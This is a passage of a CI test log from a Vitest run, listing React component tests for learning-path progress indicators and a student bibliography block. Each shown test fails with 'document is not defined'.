2025-11-18T17:36:11.3911194Z [36m [2m❯[22m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx:[2m129:5[22m[39m
2025-11-18T17:36:11.3911370Z     [90m127| [39m
2025-11-18T17:36:11.3911806Z     [90m128| [39m  it('should display pace analysis correctly', () => {
2025-11-18T17:36:11.3912006Z     [90m129| [39m    render(
2025-11-18T17:36:11.3912230Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.3912633Z     [90m130| [39m      <EnhancedProgressIndicators 
2025-11-18T17:36:11.3913013Z     [90m131| [39m        data={mockEnhancedProgressData} 
2025-11-18T17:36:11.3913025Z 
2025-11-18T17:36:11.3913376Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[322/545]⎯[22m[39m
2025-11-18T17:36:11.3913389Z 
2025-11-18T17:36:11.3914950Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx[2m > [22mEnhancedProgressIndicators[2m > [22mshould display engagement level information
2025-11-18T17:36:11.3915382Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3916097Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3917109Z [36m [2m❯[22m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx:[2m142:5[22m[39m
2025-11-18T17:36:11.3917292Z     [90m140| [39m
2025-11-18T17:36:11.3917760Z     [90m141| [39m  it('should display engagement level information', () => {
2025-11-18T17:36:11.3917975Z     [90m142| [39m    render(
2025-11-18T17:36:11.3918209Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.3918534Z     [90m143| [39m      <EnhancedProgressIndicators 
2025-11-18T17:36:11.3918891Z     [90m144| [39m        data={mockEnhancedProgressData} 
2025-11-18T17:36:11.3918903Z 
2025-11-18T17:36:11.3919265Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[323/545]⎯[22m[39m
2025-11-18T17:36:11.3919276Z 
2025-11-18T17:36:11.3920733Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx[2m > [22mEnhancedProgressIndicators[2m > [22mshould show time forecasting
2025-11-18T17:36:11.3921151Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3921866Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3922706Z [36m [2m❯[22m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx:[2m155:5[22m[39m
2025-11-18T17:36:11.3922878Z     [90m153| [39m
2025-11-18T17:36:11.3923236Z     [90m154| [39m  it('should show time forecasting', () => {
2025-11-18T17:36:11.3923663Z     [90m155| [39m    render(
2025-11-18T17:36:11.3923885Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.3924207Z     [90m156| [39m      <EnhancedProgressIndicators 
2025-11-18T17:36:11.3924557Z     [90m157| [39m        data={mockEnhancedProgressData} 
2025-11-18T17:36:11.3924568Z 
2025-11-18T17:36:11.3924930Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[324/545]⎯[22m[39m
2025-11-18T17:36:11.3924947Z 
2025-11-18T17:36:11.3926442Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx[2m > [22mEnhancedProgressIndicators[2m > [22mshould display milestones correctly
2025-11-18T17:36:11.3927509Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3928275Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3929121Z [36m [2m❯[22m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx:[2m167:5[22m[39m
2025-11-18T17:36:11.3929314Z     [90m165| [39m
2025-11-18T17:36:11.3929723Z     [90m166| [39m  it('should display milestones correctly', () => {
2025-11-18T17:36:11.3929951Z     [90m167| [39m    render(
2025-11-18T17:36:11.3930166Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.3930490Z     [90m168| [39m      <EnhancedProgressIndicators 
2025-11-18T17:36:11.3931022Z     [90m169| [39m        data={mockEnhancedProgressData} 
2025-11-18T17:36:11.3931037Z 
2025-11-18T17:36:11.3931411Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[325/545]⎯[22m[39m
2025-11-18T17:36:11.3931423Z 
2025-11-18T17:36:11.3932906Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx[2m > [22mEnhancedProgressIndicators[2m > [22mshould show study pattern analysis
2025-11-18T17:36:11.3933332Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3934052Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3934903Z [36m [2m❯[22m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx:[2m186:5[22m[39m
2025-11-18T17:36:11.3935081Z     [90m184| [39m
2025-11-18T17:36:11.3935481Z     [90m185| [39m  it('should show study pattern analysis', () => {
2025-11-18T17:36:11.3935694Z     [90m186| [39m    render(
2025-11-18T17:36:11.3935912Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.3936246Z     [90m187| [39m      <EnhancedProgressIndicators 
2025-11-18T17:36:11.3936590Z     [90m188| [39m        data={mockEnhancedProgressData} 
2025-11-18T17:36:11.3936602Z 
2025-11-18T17:36:11.3937135Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[326/545]⎯[22m[39m
2025-11-18T17:36:11.3937150Z 
2025-11-18T17:36:11.3938667Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx[2m > [22mEnhancedProgressIndicators[2m > [22mshould display motivational metrics
2025-11-18T17:36:11.3939102Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3940011Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3940846Z [36m [2m❯[22m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx:[2m200:5[22m[39m
2025-11-18T17:36:11.3941030Z     [90m198| [39m
2025-11-18T17:36:11.3941446Z     [90m199| [39m  it('should display motivational metrics', () => {
2025-11-18T17:36:11.3941671Z     [90m200| [39m    render(
2025-11-18T17:36:11.3941887Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.3942220Z     [90m201| [39m      <EnhancedProgressIndicators 
2025-11-18T17:36:11.3942564Z     [90m202| [39m        data={mockEnhancedProgressData} 
2025-11-18T17:36:11.3942576Z 
2025-11-18T17:36:11.3942924Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[327/545]⎯[22m[39m
2025-11-18T17:36:11.3942935Z 
2025-11-18T17:36:11.3944491Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx[2m > [22mEnhancedProgressIndicators[2m > [22mshould show peer comparison when available
2025-11-18T17:36:11.3944927Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3945630Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3946465Z [36m [2m❯[22m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx:[2m218:5[22m[39m
2025-11-18T17:36:11.3946960Z     [90m216| [39m
2025-11-18T17:36:11.3947440Z     [90m217| [39m  it('should show peer comparison when available', () => {
2025-11-18T17:36:11.3947662Z     [90m218| [39m    render(
2025-11-18T17:36:11.3947890Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.3948230Z     [90m219| [39m      <EnhancedProgressIndicators 
2025-11-18T17:36:11.3948572Z     [90m220| [39m        data={mockEnhancedProgressData} 
2025-11-18T17:36:11.3948584Z 
2025-11-18T17:36:11.3948946Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[328/545]⎯[22m[39m
2025-11-18T17:36:11.3948971Z 
2025-11-18T17:36:11.3950442Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx[2m > [22mEnhancedProgressIndicators[2m > [22mshould display recommendations
2025-11-18T17:36:11.3950876Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3951582Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3952434Z [36m [2m❯[22m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx:[2m233:5[22m[39m
2025-11-18T17:36:11.3952605Z     [90m231| [39m
2025-11-18T17:36:11.3952994Z     [90m232| [39m  it('should display recommendations', () => {
2025-11-18T17:36:11.3953204Z     [90m233| [39m    render(
2025-11-18T17:36:11.3953433Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.3953770Z     [90m234| [39m      <EnhancedProgressIndicators 
2025-11-18T17:36:11.3954122Z     [90m235| [39m        data={mockEnhancedProgressData} 
2025-11-18T17:36:11.3954143Z 
2025-11-18T17:36:11.3965497Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[329/545]⎯[22m[39m
2025-11-18T17:36:11.3965527Z 
2025-11-18T17:36:11.3967248Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx[2m > [22mEnhancedProgressIndicators[2m > [22mshould handle at-risk status
2025-11-18T17:36:11.3967711Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3968473Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3969348Z [36m [2m❯[22m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx:[2m256:5[22m[39m
2025-11-18T17:36:11.3969537Z     [90m254| [39m    };
2025-11-18T17:36:11.3969707Z     [90m255| [39m
2025-11-18T17:36:11.3969932Z     [90m256| [39m    render(
2025-11-18T17:36:11.3970158Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.3970495Z     [90m257| [39m      <EnhancedProgressIndicators 
2025-11-18T17:36:11.3970992Z     [90m258| [39m        data={atRiskData} 
2025-11-18T17:36:11.3971008Z 
2025-11-18T17:36:11.3971375Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[330/545]⎯[22m[39m
2025-11-18T17:36:11.3971388Z 
2025-11-18T17:36:11.3972958Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx[2m > [22mEnhancedProgressIndicators[2m > [22mshould handle missing optional data gracefully
2025-11-18T17:36:11.3973395Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3974095Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3974936Z [36m [2m❯[22m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx:[2m292:5[22m[39m
2025-11-18T17:36:11.3975131Z     [90m290| [39m    };
2025-11-18T17:36:11.3975309Z     [90m291| [39m
2025-11-18T17:36:11.3975528Z     [90m292| [39m    render(
2025-11-18T17:36:11.3975747Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.3976100Z     [90m293| [39m      <EnhancedProgressIndicators 
2025-11-18T17:36:11.3976375Z     [90m294| [39m        data={minimalData} 
2025-11-18T17:36:11.3976387Z 
2025-11-18T17:36:11.3976737Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[331/545]⎯[22m[39m
2025-11-18T17:36:11.3976749Z 
2025-11-18T17:36:11.3978997Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mBasic Rendering[2m > [22mrenders bibliography block with title and description
2025-11-18T17:36:11.3979458Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3980175Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3980946Z [36m [2m❯[22m __tests__/components/student/BibliographyBlockRenderer.test.tsx:[2m87:7[22m[39m
2025-11-18T17:36:11.3981268Z     [90m 85| [39m  describe('Basic Rendering', () => {
2025-11-18T17:36:11.3981801Z     [90m 86| [39m    it('renders bibliography block with title and description', () => {
2025-11-18T17:36:11.3982038Z     [90m 87| [39m      render(
2025-11-18T17:36:11.3982267Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3982564Z     [90m 88| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.3982875Z     [90m 89| [39m          block={bibliographyBlock}
2025-11-18T17:36:11.3982888Z 
2025-11-18T17:36:11.3983257Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[332/545]⎯[22m[39m
2025-11-18T17:36:11.3983269Z 
2025-11-18T17:36:11.3984887Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mBasic Rendering[2m > [22mrenders all bibliography items
2025-11-18T17:36:11.3985324Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3986039Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3986996Z [36m [2m❯[22m __tests__/components/student/BibliographyBlockRenderer.test.tsx:[2m101:7[22m[39m
2025-11-18T17:36:11.3987190Z     [90m 99| [39m
2025-11-18T17:36:11.3987584Z     [90m100| [39m    it('renders all bibliography items', () => {
2025-11-18T17:36:11.3987810Z     [90m101| [39m      render(
2025-11-18T17:36:11.3988036Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3988317Z     [90m102| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.3988635Z     [90m103| [39m          block={bibliographyBlock}
2025-11-18T17:36:11.3988647Z 
2025-11-18T17:36:11.3989011Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[333/545]⎯[22m[39m
2025-11-18T17:36:11.3989022Z 
2025-11-18T17:36:11.3990706Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mBasic Rendering[2m > [22mdisplays author and year information
2025-11-18T17:36:11.3991133Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3991829Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3992816Z [36m [2m❯[22m __tests__/components/student/BibliographyBlockRenderer.test.tsx:[2m116:7[22m[39m
2025-11-18T17:36:11.3992995Z     [90m114| [39m
2025-11-18T17:36:11.3993424Z     [90m115| [39m    it('displays author and year information', () => {
2025-11-18T17:36:11.3993639Z     [90m116| [39m      render(
2025-11-18T17:36:11.3993889Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.3994176Z     [90m117| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.3994486Z     [90m118| [39m          block={bibliographyBlock}
2025-11-18T17:36:11.3994504Z 
2025-11-18T17:36:11.3994859Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[334/545]⎯[22m[39m
2025-11-18T17:36:11.3994870Z 
2025-11-18T17:36:11.3996459Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mBasic Rendering[2m > [22mdisplays item descriptions
2025-11-18T17:36:11.3997163Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3997899Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3998688Z [36m [2m❯[22m __tests__/components/student/BibliographyBlockRenderer.test.tsx:[2m132:7[22m[39m
2025-11-18T17:36:11.3998862Z     [90m130| [39m
2025-11-18T17:36:11.3999435Z     [90m131| [39m    it('displays item descriptions', () => {
2025-11-18T17:36:11.3999671Z     [90m132| [39m      render(
2025-11-18T17:36:11.3999900Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.4000183Z     [90m133| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.4000502Z     [90m134| [39m          block={bibliographyBlock}
2025-11-18T17:36:11.4000523Z 
2025-11-18T17:36:11.4000883Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[335/545]⎯[22m[39m
2025-11-18T17:36:11.4000894Z 
2025-11-18T17:36:11.4002611Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mBasic Rendering[2m > [22mshows correct badges for PDF and link types
2025-11-18T17:36:11.4003074Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.4003792Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.4004590Z [36m [2m❯[22m __tests__/components/student/BibliographyBlockRenderer.test.tsx:[2m146:7[22m[39m
2025-11-18T17:36:11.4004762Z     [90m144| [39m
2025-11-18T17:36:11.4005229Z     [90m145| [39m    it('shows correct badges for PDF and link types', () => {
2025-11-18T17:36:11.4005454Z     [90m146| [39m      render(
2025-11-18T17:36:11.4005677Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.4005964Z     [90m147| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.4006298Z     [90m148| [39m          block={bibliographyBlock}
2025-11-18T17:36:11.4006310Z 
2025-11-18T17:36:11.4006697Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[336/545]⎯[22m[39m
2025-11-18T17:36:11.4006710Z 
2025-11-18T17:36:11.4008471Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mEmpty State[2m > [22mshows empty state when no items
2025-11-18T17:36:11.4008896Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.4009617Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.4010408Z [36m [2m❯[22m __tests__/components/student/BibliographyBlockRenderer.test.tsx:[2m165:7[22m[39m
2025-11-18T17:36:11.4010725Z     [90m163| [39m  describe('Empty State', () => {
2025-11-18T17:36:11.4011124Z     [90m164| [39m    it('shows empty state when no items', () => {
2025-11-18T17:36:11.4011343Z     [90m165| [39m      render(
2025-11-18T17:36:11.4011583Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.4011873Z     [90m166| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.4012499Z     [90m167| [39m          block={emptyBibliographyBlock}
2025-11-18T17:36:11.4012513Z 
2025-11-18T17:36:11.4012879Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[337/545]⎯[22m[39m
2025-11-18T17:36:11.4012891Z 
2025-11-18T17:36:11.4014618Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mSorting[2m > [22msorts items by title when sortBy is set to title
2025-11-18T17:36:11.4015041Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.4015761Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.4016539Z [36m [2m❯[22m __tests__/components/student/BibliographyBlockRenderer.test.tsx:[2m180:7[22m[39m
2025-11-18T17:36:11.4017061Z     [90m178| [39m  describe('Sorting', () => {
2025-11-18T17:36:11.4017577Z     [90m179| [39m    it('sorts items by title when sortBy is set to title', () => {
2025-11-18T17:36:11.4017816Z     [90m180| [39m      render(
2025-11-18T17:36:11.4018048Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.4018337Z     [90m181| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.4018741Z     [90m182| [39m          block={bibliographyBlockSortedByTitle}
2025-11-18T17:36:11.4018753Z 
2025-11-18T17:36:11.4019110Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[338/545]⎯[22m[39m
2025-11-18T17:36:11.4019303Z 
2025-11-18T17:36:11.4020851Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mSorting[2m > [22msorts items by author
2025-11-18T17:36:11.4021289Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.4022021Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.4022813Z [36m [2m❯[22m __tests__/components/student/BibliographyBlockRenderer.test.tsx:[2m206:7[22m[39m
2025-11-18T17:36:11.4023021Z     [90m204| [39m      };
2025-11-18T17:36:11.4023189Z     [90m205| [39m
2025-11-18T17:36:11.4023408Z     [90m206| [39m      render(
2025-11-18T17:36:11.4023644Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.4023936Z     [90m207| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.4024273Z     [90m208| [39m          block={blockSortedByAuthor}
2025-11-18T17:36:11.4024286Z 
2025-11-18T17:36:11.4024655Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[339/545]⎯[22m[39m
2025-11-18T17:36:11.4024666Z 
2025-11-18T17:36:11.4026274Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mSorting[2m > [22msorts items by year (newest first)
2025-11-18T17:36:11.4026700Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.4027599Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.4028372Z [36m [2m❯[22m __tests__/components/student/BibliographyBlockRenderer.test.tsx:[2m229:7[22m[39m
2025-11-18T17:36:11.4028567Z     [90m227| [39m      };
2025-11-18T17:36:11.4028733Z     [90m228| [39m
2025-11-18T17:36:11.4028947Z     [90m229| [39m      render(
2025-11-18T17:36:11.4029183Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.4029463Z     [90m230| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.4029805Z     [90m231| [39m          block={blockSortedByYear}
2025-11-18T17:36:11.4029818Z 
2025-11-18T17:36:11.4030169Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[340/545]⎯[22m[39m
2025-11-18T17:36:11.4030180Z 
2025-11-18T17:36:11.4031886Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mCategories[2m > [22mgroups items by category when showCategories is true
2025-11-18T17:36:11.4032314Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.4033016Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.4033916Z [36m [2m❯[22m __tests__/components/student/BibliographyBlockRenderer.test.tsx:[2m247:7[22m[39m
2025-11-18T17:36:11.4034222Z     [90m245| [39m  describe('Categories', () => {
2025-11-18T17:36:11.4034756Z     [90m246| [39m    it('groups items by category when showCategories is true', () => {
2025-11-18T17:36:11.4034995Z     [90m247| [39m      render(
2025-11-18T17:36:11.4035225Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.4035509Z     [90m248| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.4035919Z     [90m249| [39m          block={bibliographyBlockWithCategories}
2025-11-18T17:36:11.4035930Z 
2025-11-18T17:36:11.4036263Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[341/545]⎯[22m[39m
2025-11-18T17:36:11.4036280Z 
2025-11-18T17:36:11.4038403Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mCategories[2m > [22mshows items without category headers when showCategories is false
2025-11-18T17:36:11.4038878Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.4039591Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.4040538Z [36m [2m❯[22m __tests__/components/student/BibliographyBlockRenderer.test.tsx:[2m262:7[22m[39m
2025-11-18T17:36:11.4040730Z     [90m260| [39m
2025-11-18T17:36:11.4041291Z     [90m261| [39m    it('shows items without category headers when showCategories is fa…
2025-11-18T17:36:11.4041517Z     [90m262| [39m      render(
2025-11-18T17:36:11.4041752Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.4042036Z     [90m263| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.4042363Z     [90m264| [39m          block={bibliographyBlock}
2025-11-18T17:36:11.4042376Z 
2025-11-18T17:36:11.4042736Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[342/545]⎯[22m[39m
2025-11-18T17:36:11.4042760Z 
2025-11-18T17:36:11.4044327Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mInteraction[2m > [22mopens links in new tab
2025-11-18T17:36:11.4044752Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.4045475Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.4046266Z [36m [2m❯[22m __tests__/components/student/BibliographyBlockRenderer.test.tsx:[2m278:7[22m[39m
2025-11-18T17:36:11.4046583Z     [90m276| [39m  describe('Interaction', () => {
2025-11-18T17:36:11.4047090Z     [90m277| [39m    it('opens links in new tab', () => {
2025-11-18T17:36:11.4047320Z     [90m278| [39m      render(
2025-11-18T17:36:11.4047556Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.4047835Z     [90m279| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.4048165Z     [90m280| [39m          block={bibliographyBlock}
2025-11-18T17:36:11.4048191Z 
2025-11-18T17:36:11.4048547Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[343/545]⎯[22m[39m
2025-11-18T17:36:11.4048558Z 
2025-11-18T17:36:11.4050297Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mInteraction[2m > [22mcalls onComplete when continue button is clicked
2025-11-18T17:36:11.4050688Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.4051424Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.4052211Z [36m [2m❯[22m __tests__/components/student/BibliographyBlockRenderer.test.tsx:[2m296:7[22m[39m
2025-11-18T17:36:11.4052382Z     [90m294| [39m
2025-11-18T17:36:11.4052885Z     [90m295| [39m    it('calls onComplete when continue button is clicked', () => {
2025-11-18T17:36:11.4053105Z     [90m296| [39m      render(
2025-11-18T17:36:11.4053529Z     [90m   | [39m      [31m^[39m
2025-11-18T17:36:11.4053819Z     [90m297| [39m        <StudentBlockRenderer
2025-11-18T17:36:11.4054138Z     [90m298| [39m          block={bibliographyBlock}
2025-11-18T17:36:11.4054149Z 
2025-11-18T17:36:11.4054503Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[344/545]⎯[22m[39m
2025-11-18T17:36:11.4054514Z 
2025-11-18T17:36:11.4056047Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mInteraction[2m > [22mshows completed state
